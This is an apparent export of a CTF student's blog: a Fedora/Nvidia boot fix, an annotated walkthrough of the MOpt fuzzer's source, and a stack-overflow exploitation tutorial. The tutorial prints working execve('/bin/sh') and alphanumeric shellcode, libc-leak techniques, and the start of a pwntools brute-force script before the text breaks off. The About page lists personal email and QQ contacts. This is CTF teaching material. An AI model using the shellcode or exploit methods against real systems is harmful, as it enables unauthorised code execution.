{"meta":{"title":"Nemo","subtitle":"Reconstructing & Iterating","description":"Student & CTFer","author":"Nemo","url":"http://namonone.com","root":"/"},"pages":[{"title":"About","date":"2022-06-29T13:52:49.542Z","updated":"2022-06-29T13:52:49.542Z","comments":false,"path":"about/index.html","permalink":"http://namonone.com/about/index.html","excerpt":"","text":"About me Student and CTFer(pwn) of SCSE(School of Cyber Science and Engineering), WHU. Now I focus on studying of Fuzz. Interest Games: Yu-Gi-Oh!(游戏王): Virtual World(电脑堺), Orcust(自奏圣乐) Arknights(明日方舟) JRPG The Legend of Heroes(轨迹系列) Persona(女神异闻录系列) … Light player of Act: Monster Hunter(怪物猎人系列) Devil May Cry(鬼泣) … Leisure: Rune Factory(符文工房系列) … RPG: Baldur’ s gate(博德之门) Disco Elysium other 3A Films: For films, I see it as the art of sight and sound. So I don’t like the Drama(剧情片), but prefer the films that have engrossing shots. Having a preference for Europe、Japan Director and films. Recently watched: Love Letter, directed by いわい しゅんじ(岩井俊二) 东邪西毒, directed by 王家卫 PROMARE, directed by いまいし ひろゆき(今石洋之) Mobile Suit Gundam: Hathaway’s Flash … Books: Literature History Monograph Fiction … Contact me e-mail: Personal e-mail: wzhdxtx123@outlook.com work e-mail: nemoxxw@whu.edu.cn QQ: 2499291623 Github: github.com/Du-Mu"},{"title":"Categories","date":"2022-06-29T15:40:14.538Z","updated":"2022-06-29T15:40:14.538Z","comments":false,"path":"categories/index.html","permalink":"http://namonone.com/categories/index.html","excerpt":"","text":""},{"title":"Links","date":"2022-06-29T14:01:36.126Z","updated":"2022-06-29T14:01:36.126Z","comments":false,"path":"links/index.html","permalink":"http://namonone.com/links/index.html","excerpt":"","text":"NULL 快来个人和我互关#_#"},{"title":"Repositories","date":"2022-06-29T07:14:46.657Z","updated":"2022-06-29T07:14:46.651Z","comments":false,"path":"repository/index.html","permalink":"http://namonone.com/repository/index.html","excerpt":"","text":""},{"title":"Tags","date":"2022-06-29T15:39:20.303Z","updated":"2022-06-29T15:39:20.303Z","comments":false,"path":"tags/index.html","permalink":"http://namonone.com/tags/index.html","excerpt":"","text":""}],"posts":[{"title":"Fedora-and-Nvidia-driver-installing","slug":"Fedora-and-Nvidia-driver-installing","date":"2022-10-14T16:00:00.000Z","updated":"2022-10-15T00:24:46.367Z","comments":true,"path":"2022/10/15/Fedora-and-Nvidia-driver-installing/","link":"","permalink":"http://namonone.com/2022/10/15/Fedora-and-Nvidia-driver-installing/","excerpt":"","text":"背景 最近一直在折腾自己的windows的配置，包括外观还有各种环境的配置，感觉自己做的颇为臃肿了，所以打算配一个Fedora的双系统，从头开始规划，配置作为自己的主力办公系统。 就我个人而言，我在之前有过一段时间的Ubuntu的虚拟机的使用，对于Red Hat系的linux发行版没有什么使用经验，同时，对于双系统，引导启动没有过多的概念，此为前提。 问题的出现 在初步了解了一些双系统的知识后，我开始了自己的Fedora安装之旅。 首先在windows下创建一个空闲的硬盘分区 利用Fedora提供的官方工具Fedora Media Writer制作了一个Fedora的启动U盘 开机时进入BIOS，选择从引导盘启动 一切都很顺利，然而在我在Grub中选择Start Fedora时，在一段时间运行后，还没有进入安装时，Fedora就直接终止了，黑屏一段时间后，就直接返回了Grub界面，这让我有些懵了。 问题的定位 在问题出现后，第一反应，肯定是直接搜索看有没有跟我相同的问题出现，于是我分别在Google 和ask Fedora论坛上同时搜索了这个问题，但是没有找到相关结果，难道要在ask fedora上提问吗？这个得到回答的周期对我来说可能太长了，我还是尽可能想自己尽快找出结果。 那么思路就很清晰了，首先排除偶然因素： 于是我重新制作了一个启动盘，在此尝试了一下，然而还是闪退，既然问题是稳定出现的，我开始真正定位问题： 考虑在这个安装环节中，我都是同大多人一样的步骤，那么我开始回顾在这个安装过程中有哪些环节可以出问题： iso文件 linux发行版特性 U盘 于是我开始尝试更换发行版，包括Fedora37和ubuntu22，然而还是稳定出现了闪退问题。那iso文件问题或者linux发行版问题可以排除了。 接下来再换了一个U盘，然而还是闪退。 到这里，似乎已经进入死胡同了，难道是电脑的问题？我不可能为此换一个电脑啊，似乎这不是我能解决的问题了，因为我对引导启动过程只是一知半解，想debug也无从下手。 这个时候我看着Grub的界面，开始了思考和尝试: --------------------------------------------Grub-------------------------------------------------- *start Fedora test this media &amp; start Fedora troubleshouting-----&gt; 在第一个和第二个选项都已经尝试过后，我自然的进入第三个选项troubleshouting上了，出乎意料的，在troubleshouting后，我发现我进入了Fedora的安装界面，虽然分辨率堪忧，但是有了进展和区别，总是好的。 于是我重新回到Grub界面，按e键分别查看前三个选项的启动命令行，分析差别。 一个显而易见的差别映入我的眼帘，“nomodeset”参数，这个参数在troubleshouting中有，然而在前两个选项中没有，这会是troubleshouting能成功启动的原因吗？ 于是我在e键跟进了第一个选项，添加了nomedeset参数，ctrl+x键执行，成功进入安装界面，虽然依旧是分辨率堪忧。 于是再次Google nomedeset的作用，发现是暂且不加载显卡模块。看见显卡二字，以及自己电脑上绿色的Nvidia商标，再联想到linus著名的f**k nvidia之喷，我大概确定了了，是显卡的问题。 解决问题 既然确定了是显卡的问题，那么转换搜索思路，以Nvidia为关键词再在ask fedora搜索，于是找到了这个 Problem On systems with certain Nvidia graphics cards, Fedora 36 KDE fails to boot in UEFI mode. This includes both the Live installer image and the installed system. It only happens in combination with Wayland display protocol, but the KDE login screen it configured to use Wayland by default, so this happens every time, unless the settings are changed in the installed system. Cause Not yet known. In general, Nvidia’s attitude towards Linux. Related Issues Bugzilla report: 2077359 – KDE on X11 with native graphics hangs with Nvidia GPU and UEFI 53 Workarounds You have the following options: A) Switch your system to BIOS mode instead of UEFI and install Fedora that way. B) Boot the install in Safe graphics mode (available under the Troubleshooting boot menu). After system install, either install the closed-source nvidia driver (if you intended to do so), or set KDE to always use X11 instead of Wayland, including the login screen. Then edit the grub config files to remove the nomodeset keyword (triggering safe graphics mode) and rebuild the installed grub bootloader config. C) Install Fedora Workstation (GNOME) instead of KDE. D) Switch your graphics card to a more Linux-friendly vendor (AMD, Intel). You might already have an integrated graphics card in your CPU which you can use instead of the Nvidia external one. 那么基本确定了解决思路： nomodeset先install fedora，然后进入fedora安装Nvidia显卡驱动，然后再重新启动。 当然，在安装驱动过程中也遇到了一些问题，网络上对于驱动安装基本有三种主流的方法： 在dnf添加两个源，用dnf安装 用Nvidia官方的脚本安装 在dnf添加一个module，用dnf安装(由于我是第一次使用red hat系的发行版，对dnf不是很熟，不是很能理解和第一个的区别) 尝试了一下后，发现第一第二种都出现了一些莫名其妙的问题，最后在第三种方法下完美完成。 一些感想 //突然没灵感，待写","categories":[{"name":"Linux","slug":"Linux","permalink":"http://namonone.com/categories/Linux/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"http://namonone.com/tags/Linux/"}]},{"title":"PaperReading-Fuzz-MOpt","slug":"PaperReading-Fuzz-MOpt","date":"2022-08-16T16:00:00.000Z","updated":"2022-08-17T12:26:57.284Z","comments":true,"path":"2022/08/17/PaperReading-Fuzz-MOpt/","link":"","permalink":"http://namonone.com/2022/08/17/PaperReading-Fuzz-MOpt/","excerpt":"","text":"MOPT MOpt是针对传统Mutation based fuzz的变异策略的一种改进Fuzzer，主要通过PSO算法优化了变异操作的选取 0x1.核心思路 0x1.1.传统Fuzz的变异策略存在的问题 Different operators’ efficiency varies. 不同Mutation operators的效率不同 One operator’s efficiency varies with target programs. One operator’s efficiency varies over time. The scheduler incurs performance overhead. Unbalanced data for machine learning. 这些问题，要求我们用更智能化的方法选择各种Mutation operators 0x1.2.MOpt 将每个Mutation operators视为PSO中的一个particle，寻找其最佳概率 0x1.2.1.一些参数 L~best~ : particle在概率空间中的最佳(对应的优秀测试用例更多)分布 G~best~ : 区别于传统粒子群算法，在计算时，实际上所有particle分布在不同的概率空间，不可能存在一个传统意义上的适应于所有particle的G~best~，那么同样从全局意义考虑，将所有particle对应的interesting test cases数量之和，作为整个swarm的globel~eff~，而每个partcle在globel~eff~ 中的比例，作为其对应的G~best~ 0x1.2.2.overview 在每一次fuzz过程中额外的三个task: 更新每个particle的L~best~ 为效率最高的eff~best~ 更新每个particle的G~best~ 选择最好的swarm指导fuzzing(避免陷入局部最优点) // 一个疑问 同时，在每次迭代最后，还要按照PSO算法，更行每个particle的position 12345vnow[Si][Pj] ←w × vnow[Si][Pj] +r × (Lbest [Si][Pj] − xnow[Si][Pj]) +r × (Gbest [Pj] − xnow[Si][Pj]). (3) xnow[Si][Pj] ← xnow[Si][Pj] + vnow[Si][Pj]. (4) 0x1.2.3.Main Framework PSO Initialization Module: 负责PSO相关参数的初始化: 设置每个swarm中的每个particle的X~now~ 为随机值，并保证每个群中的X~now~之和为1 把每个particle的*V~now~*设置为0.1 设置每个particle的*eff~now~*为0 设置每个particle的*G~best~和L~best~*为0.5 Pilot Fuzzing Module 对多个swarm找最优概率分布 Core Fuzzing Module 针对一个swarm找最优概率分布 PSO Updating Module 根据PSO算法迭代V~now~和X~now~ Pacemaker Fuzzing Mode 主要是针对Mutation based fuzz的deterministic stage，对于特定的条件，酌情跳过，deterministic stage，以提高效率。 对于上述模块的具体分析放在源代码分析中。 0x2.源代码分析 主要分析相对于AFL算法所作的改进， 以源代码中的中文注释为主要形式 差异部分: 原调用链： main-&gt;fuzz_one 现调用链: main-&gt;fuzz_one-&gt;normal_fuzz / pivot_fuzz / core_fuzz / pso_update 主要更改了afl-fuzz.c-&gt;fuzz_one-&gt;havoc环节的逻辑 整体思路(红线部分为我自己添加的MOpt思路，原图来自MOpt原论文，表明AFL的mutatition stage): 0x2.1.main() 关注主要逻辑，根据需要，选择性的忽视了一些无关主要逻辑的代码 新增参数判断 -L 参数负责控制转入Pacemaker Fuzzing Mode的时间。 123456789101112131415161718192021222324 case &#x27;L&#x27;: &#123; /* MOpt mode */// L 参数负责控制转入Pacemaker Fuzzing Mode的时间 // -L 30 相当于24小时左右 // ref: https://github.com/puppet-meteor/MOpt-AFL //if (limit_time_sig) FATAL(&quot;Multiple -L options not supported&quot;); limit_time_sig = 1; // if (sscanf(optarg, &quot;%llu&quot;, &amp;limit_time_puppet) &lt; 1 || optarg[0] == &#x27;-&#x27;) FATAL(&quot;Bad syntax used for -L&quot;); u64 limit_time_puppet2 = limit_time_puppet * 60 * 1000; if (limit_time_puppet2 &lt; limit_time_puppet ) FATAL(&quot;limit_time overflow&quot;); limit_time_puppet = limit_time_puppet2; SAYF(&quot;limit_time_puppet %llu\\n&quot;,limit_time_puppet); if (limit_time_puppet == 0 ) key_puppet = 1; &#125; break; 针对MOpt的全局变量的初始化 对应于前文的PSO Initialization Module 具体内容可以查看前文 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071&#123; //initialize swarms int i; int tmp_swarm = 0; swarm_now = 0; if (g_now &gt; g_max) g_now = 0; w_now = (w_init - w_end)*(g_max - g_now) / (g_max)+w_end; for (tmp_swarm = 0; tmp_swarm &lt; swarm_num; tmp_swarm++) &#123; double total_puppet_temp = 0.0; swarm_fitness[tmp_swarm] = 0.0; for (i = 0; i &lt; operator_num; i++) &#123; stage_finds_puppet[tmp_swarm][i] = 0; probability_now[tmp_swarm][i] = 0.0; x_now[tmp_swarm][i] = ((double)(random() % 7000)*0.0001 + 0.1); total_puppet_temp += x_now[tmp_swarm][i]; v_now[tmp_swarm][i] = 0.1; L_best[tmp_swarm][i] = 0.5; G_best[i] = 0.5; eff_best[tmp_swarm][i] = 0.0; &#125; for (i = 0; i &lt; operator_num; i++) &#123; stage_cycles_puppet_v2[tmp_swarm][i] = stage_cycles_puppet[tmp_swarm][i]; stage_finds_puppet_v2[tmp_swarm][i] = stage_finds_puppet[tmp_swarm][i]; x_now[tmp_swarm][i] = x_now[tmp_swarm][i] / total_puppet_temp; &#125; double x_temp = 0.0; for (i = 0; i &lt; operator_num; i++) &#123; probability_now[tmp_swarm][i] = 0.0; v_now[tmp_swarm][i] = w_now * v_now[tmp_swarm][i] + RAND_C * (L_best[tmp_swarm][i] - x_now[tmp_swarm][i]) + RAND_C * (G_best[i] - x_now[tmp_swarm][i]); x_now[tmp_swarm][i] += v_now[tmp_swarm][i]; if (x_now[tmp_swarm][i] &gt; v_max) x_now[tmp_swarm][i] = v_max; else if (x_now[tmp_swarm][i] &lt; v_min) x_now[tmp_swarm][i] = v_min; x_temp += x_now[tmp_swarm][i]; &#125; for (i = 0; i &lt; operator_num; i++) &#123; x_now[tmp_swarm][i] = x_now[tmp_swarm][i] / x_temp; if (likely(i != 0)) probability_now[tmp_swarm][i] = probability_now[tmp_swarm][i - 1] + x_now[tmp_swarm][i]; else probability_now[tmp_swarm][i] = x_now[tmp_swarm][i]; &#125; if (probability_now[tmp_swarm][operator_num - 1] &lt; 0.99 || probability_now[tmp_swarm][operator_num - 1] &gt; 1.01) FATAL(&quot;ERROR probability&quot;); &#125; for (i = 0; i &lt; operator_num; i++) &#123; core_operator_finds_puppet[i] = 0; core_operator_finds_puppet_v2[i] = 0; core_operator_cycles_puppet[i] = 0; core_operator_cycles_puppet_v2[i] = 0; core_operator_cycles_puppet_v3[i] = 0; &#125;&#125; 0x2.2.select_algorithm() 根据PSO获得的概率分布，选择不同的变异算法 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748int select_algorithm(int extras) &#123; int i_puppet, j_puppet; //double total_puppet = 0.0;//srandom(time(NULL)); u32 seed[2]; ck_read(dev_urandom_fd, &amp;seed, sizeof(seed), &quot;/dev/urandom&quot;); srandom(seed[0]); //double sele = ((double)(random()%10000)*0.0001); //SAYF(&quot;select : %f\\n&quot;,sele); j_puppet = 0; int operator_number = operator_num; if (extras &lt; 2) operator_number = operator_number - 2; double range_sele = (double)probability_now[swarm_now][operator_number - 1]; double sele = ((double)(random() % 10000) * 0.0001 * range_sele); // 这里的probability_now由pso_uadating()确定// probability_now是一个概率的前缀和数组，// 最后一位也就是probability_now[swarm_now][operator_number - 1]应该为1 for (i_puppet = 0; i_puppet &lt; operator_number; i_puppet++) &#123; if (unlikely(i_puppet == 0)) &#123; if (sele &lt; probability_now[swarm_now][i_puppet]) break; &#125; else &#123; if (sele &lt; probability_now[swarm_now][i_puppet]) &#123; j_puppet =1; break; &#125; &#125; &#125; // 由上面对于sele的分析，可以知道这里是按照对应的概率设置i_puppet // i_puppet对应选择到的操作 if ((j_puppet ==1 &amp;&amp; sele &lt; probability_now[swarm_now][i_puppet-1]) || (i_puppet + 1 &lt; operator_num &amp;&amp; sele &gt; probability_now[swarm_now][i_puppet + 1])) FATAL(&quot;error select_algorithm&quot;); return i_puppet;&#125; 0x2.2.fuzz_one() fuzz_one() 是完成Mutation operators的核心流程，在main()中每一次fuzz循环中被调用 1234567891011121314151617181920static u8 fuzz_one(char** argv) &#123; int key_val_lv = 0; if (limit_time_sig == 0) key_val_lv = normal_fuzz_one(argv); // normal_fuzz_one() 是原来AFL的fuzz_one() else &#123; if (key_module == 0) key_val_lv = pilot_fuzzing(argv); // 对应0x1.2.3.Main Framework 中的pilot fuzzing module else if (key_module == 1) key_val_lv = core_fuzzing(argv); // 对应core fuzzing module else if (key_module == 2) pso_updating(); // 对应PSO updating module &#125; return key_val_lv; &#125; 0x2.3.pilot_fuzzing() 这是整个MOpt的核心模块，他是在原AFL的基础上修改得到的，所以主要分析和原AFL的差异部分。 core_pilot与此类似，所以不做单独分析 0x2.3.1.Pacemaker Fuzzing Mode 由于deterministic stage的小型改动在前期比较有用，在后期长时间处于deterministic stage会导致效率下降，所以在原fuzz_one() 直接跳到havoc_stage() 的逻辑后面，增加一个时间判断，判断是否要直接跳到havoc_stage() 12345678910111213// line 6999 in afl_fuzz.ccur_ms_lv = get_cur_time();// 获取当前时间if (!(key_puppet == 0 &amp;&amp; ((cur_ms_lv - last_path_time &lt; limit_time_puppet) (last_crash_time != 0 &amp;&amp; cur_ms_lv - last_crash_time &lt; limit_time_puppet) || last_path_time == 0)))// 如果距离上一次crash或者找到新路径的时间，超过了通过-L参数设置的limit_time_puppet// 说明长时间陷入了deterministic stage// 直接跳过deterministic stage进入havoc_stage()&#123; key_puppet = 1; goto pacemaker_fuzzing;&#125; 0x2.3.2.Mutation operators select 在havoc阶段，要进行变异策略的选择，相比于原来的随机选择，MOpt根据PSO得到的概率分布进行策略的选择 123// line 8165 in afl-fuzz.cswitch (select_algorithm( extras_cnt + a_extras_cnt )) 0x2.3.3.Before return 返回前新增的一些变化 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374if (key_puppet == 1)//一个小型的flag//在前面pacemaker的跳转时被设置为1&#123; if (unlikely(queued_paths + unique_crashes &gt; ((queued_paths + unique_crashes)*limit_time_bound + orig_hit_cnt_puppet))) &#123; key_puppet = 0; cur_ms_lv = get_cur_time(); new_hit_cnt = queued_paths + unique_crashes; orig_hit_cnt_puppet = 0; last_limit_time_start = 0; &#125;&#125;// 还原并更新一些变量if (unlikely(tmp_pilot_time &gt; period_pilot))&#123; total_pacemaker_time += tmp_pilot_time; new_hit_cnt = queued_paths + unique_crashes; swarm_fitness[swarm_now] = (double)(total_puppet_find - temp_puppet_find) / ((double)(tmp_pilot_time)/ period_pilot_tmp); tmp_pilot_time = 0; temp_puppet_find = total_puppet_find; u64 temp_stage_finds_puppet = 0; for (i = 0; i &lt; operator_num; i++) &#123; double temp_eff = 0.0; if (stage_cycles_puppet_v2[swarm_now][i] &gt; stage_cycles_puppet[swarm_now][i]) temp_eff = (double)(stage_finds_puppet_v2[swarm_now][i] - stage_finds_puppet[swarm_now][i]) / (double)(stage_cycles_puppet_v2[swarm_now][i] - stage_cycles_puppet[swarm_now][i]); if (eff_best[swarm_now][i] &lt; temp_eff) &#123; eff_best[swarm_now][i] = temp_eff; L_best[swarm_now][i] = x_now[swarm_now][i]; &#125; // 找到particle对应的历史最优概率分布 // 更新L_best stage_finds_puppet[swarm_now][i] = stage_finds_puppet_v2[swarm_now][i]; stage_cycles_puppet[swarm_now][i] = stage_cycles_puppet_v2[swarm_now][i]; temp_stage_finds_puppet += stage_finds_puppet[swarm_now][i]; // 更新一些和计算 生成的好的test case数量 相关的变量 &#125; swarm_now = swarm_now + 1; if (swarm_now == swarm_num) &#123; key_module = 1; for (i = 0; i &lt; operator_num; i++) &#123; core_operator_cycles_puppet_v2[i] = core_operator_cycles_puppet[i]; core_operator_cycles_puppet_v3[i] = core_operator_cycles_puppet[i]; core_operator_finds_puppet_v2[i] = core_operator_finds_puppet[i]; &#125; // 更新一些和计算 生成的好的test case数量 相关的变量 double swarm_eff = 0.0; swarm_now = 0; for (i = 0; i &lt; swarm_num; i++) &#123; if (swarm_fitness[i] &gt; swarm_eff) &#123; swarm_eff = swarm_fitness[i]; swarm_now = i; &#125; &#125; // 选择最好的swarm if (swarm_now &lt;0 || swarm_now &gt; swarm_num - 1) PFATAL(&quot;swarm_now error number %d&quot;, swarm_now); &#125; &#125; 0x2.4.pso_updating() 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556void pso_updating(void) &#123; g_now += 1; if (g_now &gt; g_max) g_now = 0; w_now = (w_init - w_end)*(g_max - g_now) / (g_max)+w_end; int tmp_swarm, i, j; u64 temp_operator_finds_puppet = 0; for (i = 0; i &lt; operator_num; i++) &#123; operator_finds_puppet[i] = core_operator_finds_puppet[i]; for (j = 0; j &lt; swarm_num; j++) &#123; operator_finds_puppet[i] = operator_finds_puppet[i] + stage_finds_puppet[j][i]; &#125; temp_operator_finds_puppet = temp_operator_finds_puppet + operator_finds_puppet[i]; &#125; // 计算变异产生的好test cese的个数 // 为更新G_best()做准备 for (i = 0; i &lt; operator_num; i++) &#123; if (operator_finds_puppet[i]) G_best[i] = (double)((double)(operator_finds_puppet[i]) / (double)(temp_operator_finds_puppet)); &#125; // 更新G_best()，即PSO中的全局最优分布 for (tmp_swarm = 0; tmp_swarm &lt; swarm_num; tmp_swarm++) &#123; double x_temp = 0.0; for (i = 0; i &lt; operator_num; i++) &#123; probability_now[tmp_swarm][i] = 0.0; v_now[tmp_swarm][i] = w_now * v_now[tmp_swarm][i] + RAND_C * (L_best[tmp_swarm][i] - x_now[tmp_swarm][i]) + RAND_C * (G_best[i] - x_now[tmp_swarm][i]); x_now[tmp_swarm][i] += v_now[tmp_swarm][i]; if (x_now[tmp_swarm][i] &gt; v_max) x_now[tmp_swarm][i] = v_max; else if (x_now[tmp_swarm][i] &lt; v_min) x_now[tmp_swarm][i] = v_min; x_temp += x_now[tmp_swarm][i]; &#125; // 根据pso算法更新v_now数组和x_now数组 for (i = 0; i &lt; operator_num; i++) &#123; x_now[tmp_swarm][i] = x_now[tmp_swarm][i] / x_temp; if (likely(i != 0)) probability_now[tmp_swarm][i] = probability_now[tmp_swarm][i - 1] + x_now[tmp_swarm][i]; else probability_now[tmp_swarm][i] = x_now[tmp_swarm][i]; &#125; // 设置probablility_now为前缀和数组 // 供select_algorithm使用 if (probability_now[tmp_swarm][operator_num - 1] &lt; 0.99 || probability_now[tmp_swarm][operator_num - 1] &gt; 1.01) FATAL(&quot;ERROR probability&quot;); &#125; swarm_now = 0; key_module = 0; &#125;","categories":[{"name":"Fuzz","slug":"Fuzz","permalink":"http://namonone.com/categories/Fuzz/"}],"tags":[{"name":"Fuzz","slug":"Fuzz","permalink":"http://namonone.com/tags/Fuzz/"}]},{"title":"Multiple-attack-methods-of-Stack-Overflow","slug":"Multiple-attack-methods-of-Stack-Overflow","date":"2022-08-02T16:00:00.000Z","updated":"2022-08-05T07:59:18.787Z","comments":true,"path":"2022/08/03/Multiple-attack-methods-of-Stack-Overflow/","link":"","permalink":"http://namonone.com/2022/08/03/Multiple-attack-methods-of-Stack-Overflow/","excerpt":"","text":"0x1.杂谈 作为一种基本的漏洞，栈溢出在CTF中出现的非常频繁，因为其多样化的利用形式，难以进行系统的归类，本文结合我个人的经验，综合讨论各种栈溢出技术，如果有遗漏，欢迎评论留言，或者给我发邮件，进行补充。 本文持续更新，为广大pwn选手入门提供完善帮助 本文一定程度上参考了各种博客，CTF-wiki, CTF-All-in-One 怎么去看待栈溢出题呢? 尽管利用方法多样，但是，就我个人的看法而言，整个栈溢出实际上只分为三种: ret2syscall, ret2libc, ret2shellcode 实际上应该还有ret2text， 然而实在过于简单，一般不会在ctf题目中出现。 一般而言，pwn题的目的都是getshell(当然，也有直接读取flag的，这个后面单独谈)，而getshell 无外乎就三种途径，syscall，libc-system，shellcode 当拿到一个题目时，首先思考： 是否有syscall----&gt;ret2syscall 有可读可写内存空间吗----&gt;ret2shellcode 给了libc文件或者有信息泄露函数(IO函数)----&gt;ret2libc 接下来，再分门别类谈: 0x1.ret2syscall 因为syscall属于相对简单的，暂且放在前面谈。 %rax System call %rdi %rsi %rdx %r10 %r8 %r9 59 sys_execve const char *filename const char *const argv[] const char *const envp[] 一般而言，需要syscall的题目中，都是构造这个系统调用实现。 而在一些题目中通过seccomp禁用了execve的调用，所以不能直接利用，那么就利用open, read, write 直接读取flag文件，也是一种办法。 而在syscall中，最为重要也是最麻烦的一步，就是在哪个地址写入/bin/sh（如果本地文件没有/bin/sh的话），一般而言，有三个选择，.data, .bss， 栈上。 在没开PIE的程序中，可以考虑通过write写入.data段或者买.bss段。 或者考虑通过rsp获取栈上地址，或者partial overwrite带出栈上地址。 总的而言，就是选择能够获取到地址的地方写入/bin/sh。 例题: ciscn_s_3 0x2.ret2shellcode 0x2.1.shellcode的书写 一般而言，可以直接通过pwntools 相应模块直接生成shellcode，然而现在以shellcode为考点的题目，一般都会对shellcode做出限制，诸如不能包含可打印字符等等。所以尽可能自己熟悉shellcode的书写。 一个简单的shellcode例子: 123456789101112131415161718192021// execve(path = &#x27;/bin///sh&#x27;, argv = [&#x27;sh&#x27;], envp = 0)push 0x68mov rax, 0x732f2f2f6e69622fpush raxmov rdi, rsp// push argument array [&#x27;sh\\x00&#x27;]// push b&#x27;sh\\x00&#x27; push 0x1010101 ^ 0x6873xor dword ptr [rsp], 0x1010101xor esi, esi /* 0 */push rsi /* null terminate */push 8pop rsiadd rsi, rsppush rsi /* &#x27;sh\\x00&#x27; */mov rsi, rspxor edx, edx /* 0 */// call execve()push SYS_execve /* 0x3b */pop raxsyscall 这里获取/bin/sh地址的方式，是将其压入栈中，再通过rsp偏移获取相应地址。 不过一般而言，pwn题目运行shellcode，一般是采用寄存器跳转，即jmp rax此类，那么其实可以通过跳转寄存器获取shellcode存放地址，并且将/bin/sh直接镶入shellcode后面，简化shellcode书写。 同时，有些题目会对shellcode有所限制，限制只能包含可打印字符或者纯粹字母数字。这就限制了shellcode的书写，mov和syscall都会遭到限制， 可用指令如下: 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768691.数据传送:push/pop eax…pusha/popa2.算术运算:inc/dec eax…sub al, 立即数sub byte ptr [eax… + 立即数], al dl…sub byte ptr [eax… + 立即数], ah dh…sub dword ptr [eax… + 立即数], esi edisub word ptr [eax… + 立即数], si disub al dl…, byte ptr [eax… + 立即数]sub ah dh…, byte ptr [eax… + 立即数]sub esi edi, dword ptr [eax… + 立即数]sub si di, word ptr [eax… + 立即数]3.逻辑运算:and al, 立即数and dword ptr [eax… + 立即数], esi ediand word ptr [eax… + 立即数], si diand ah dh…, byte ptr [ecx edx… + 立即数]and esi edi, dword ptr [eax… + 立即数]and si di, word ptr [eax… + 立即数]xor al, 立即数xor byte ptr [eax… + 立即数], al dl…xor byte ptr [eax… + 立即数], ah dh…xor dword ptr [eax… + 立即数], esi edixor word ptr [eax… + 立即数], si dixor al dl…, byte ptr [eax… + 立即数]xor ah dh…, byte ptr [eax… + 立即数]xor esi edi, dword ptr [eax… + 立即数]xor si di, word ptr [eax… + 立即数]4.比较指令:cmp al, 立即数cmp byte ptr [eax… + 立即数], al dl…cmp byte ptr [eax… + 立即数], ah dh…cmp dword ptr [eax… + 立即数], esi edicmp word ptr [eax… + 立即数], si dicmp al dl…, byte ptr [eax… + 立即数]cmp ah dh…, byte ptr [eax… + 立即数]cmp esi edi, dword ptr [eax… + 立即数]cmp si di, word ptr [eax… + 立即数]5.转移指令:push 56hpop eaxcmp al, 43hjnz lable&lt;=&gt; jmp lable6.交换al, ahpush eaxxor ah, byte ptr [esp] // ah ^= alxor byte ptr [esp], ah // al ^= ahxor ah, byte ptr [esp] // ah ^= alpop eax7.清零:push 44hpop eaxsub al, 44h ; eax = 0push esipush esppop eaxxor [eax], esi ; esi = 0 一般而言, 我们采用xor或者sub指令修改shellcode后面的值，构造0f 05， 实现syscall。 一个例子(纯字母数字shellcode): 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455// ref: https://hama.hatenadiary.jp/entry/2017/04/04/190129/* from call rax */push raxpush raxpop rcx/* XOR pop rsi, pop rdi, syscall */push 0x41413030pop raxxor DWORD PTR [rcx+0x30], eax/* XOR /bin/sh */push 0x34303041pop raxxor DWORD PTR [rcx+0x34], eaxpush 0x41303041pop raxxor DWORD PTR [rcx+0x38], eax/* rdi = &amp;&#x27;/bin/sh&#x27; */push rcxpop raxxor al, 0x34push rax/* rdx = 0 */push 0x30pop raxxor al, 0x30push raxpop rdxpush rax/* rax = 59 (SYS_execve) */push 0x41pop raxxor al, 0x7a/* pop rsi, pop rdi*//* syscall */ .byte 0x6e.byte 0x6f.byte 0x4e.byte 0x44/* /bin/sh */.byte 0x6e.byte 0x52.byte 0x59.byte 0x5a.byte 0x6e.byte 0x43.byte 0x5a.byte 0x41 0x2.2.shellcode生成工具 同时，现在有多种针对shellcode进行编码的生成工具，生成符合限制的shellcode，如msf，alpha3等等，由于我没有用过，可以自行尝试。 0x2.3.mprotect() 进一步的，很多题目没有天然的readable and executable segment，题目可能通过mmap()映射了一段权限为7的段，或者存在mprotect()函数。 这个函数可以修改指定内存段的权限 12345mprotect:int mprotect(void *addr, size_t len, int prot);addr 内存起始地址len 修改内存的长度prot 内存的权限，7为可读可写可执行 如果存在这样的函数，可以考虑将其加入ROP链，从而进一步调用shellcode 0x3.ret2libc 0x3.1.leak_libc 对于最后调用 libc 中 system 的题目而言，需要考虑的首要问题就是leak_libc. 目前而言，我遇到的栈题中leak_libc，有两种方法： partial_overwrite 有时候，在栈中会存留libc中地址，在后面存在直接输出的函数的情况下，可以带出此地址。 通过puts，write等函数，打印.got，获取对应函数的地址，这里，在没有给定对应libc版本的情况下，也可以通过LibcSearcher查找对应libc版本 1234567891011# ref: https://github.com/lieanu/LibcSearcherfrom LibcSearcher import *#第二个参数，为已泄露的实际地址,或最后12位(比如：d90)，int类型obj = LibcSearcher(&quot;fgets&quot;, 0X7ff39014bd90)obj.dump(&quot;system&quot;) #system 偏移obj.dump(&quot;str_bin_sh&quot;) #/bin/sh 偏移obj.dump(&quot;__libc_start_main_ret&quot;) 0x3.2.partial_overwrite (1)前置知识 针对没有泄露的赛题，可以考虑partial_overwrite改写got表，实现system，因为一般而言，大部分libc函数，里面都存在syscall，所以syscall偏移和函数head_addr差别不会太大。 考虑对于一个got表中的64位地址: 0xXXXXXXXXXXXXX， 假设其附近的syscall地址后三位偏移为0xaaa(请确定这个偏移和got内函数偏移只有最后四个16位数字不同)， 因为libc装载地址以页为单位，后三位是确定0x000，那么partial_overwrite覆盖后面两个字节， 即覆盖got为0xXXXXXXXXfaaa，那么有1/16的几率恰好syscall (2)爆破脚本写法 一个爆破脚本模板: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960from pwn import *import syself =&#x27;./ciscn_s_3&#x27;remote_add = &#x27;node4.buuoj.cn&#x27;remote_port = 29554main_add = 0x40051doff = 0x130system_add = 0x400517rtframe = 0x4004daret_add = 0x4004e9i = 0while i &lt; 20: try: context.log_level = &#x27;debug&#x27; context.arch = &#x27;amd64&#x27; if sys.argv[1] == &#x27;r&#x27;: p = remote(remote_add, remote_port, timeout = 1) elif sys.argv[1] == 